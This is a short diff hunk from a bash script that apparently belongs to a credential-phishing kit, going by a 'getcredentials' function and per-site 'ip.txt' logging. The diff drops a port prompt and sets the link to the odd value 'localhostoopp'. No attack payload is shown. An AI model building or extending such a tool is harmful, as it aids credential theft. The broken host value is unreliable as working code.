@@ -343,12 +343,11 @@ getcredentials
 
 start() {
 
-default_port="8080"
-defaultlink="localhost"
-printf '\e[1;92m[\e[0m*\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
 
-read port
-port="${port:-${default_port}}"
+defaultlink="localhostoopp"
+
+
+
 
 # Delete ip.txt file if exist
 if [[ -e sites/$server/ip.txt ]]; then
